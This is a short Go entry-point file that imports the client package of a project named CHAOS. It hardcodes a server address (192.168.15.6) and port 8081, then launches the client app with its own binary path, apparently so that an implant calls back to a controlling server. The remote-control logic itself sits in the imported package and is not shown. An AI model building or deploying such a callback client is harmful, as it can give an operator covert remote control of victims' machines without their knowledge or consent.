package main

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app"
	"os"
)

var (
	ServerPort    = "8081"
	ServerAddress = "192.168.15.6"
)

func main() {
	binaryPath := os.Args[0]
	if err := app.NewApp(ServerAddress, ServerPort, binaryPath).Run(); err != nil {
		log.WithField("cause", err.Error()).Fatal("error starting app")
	}
}
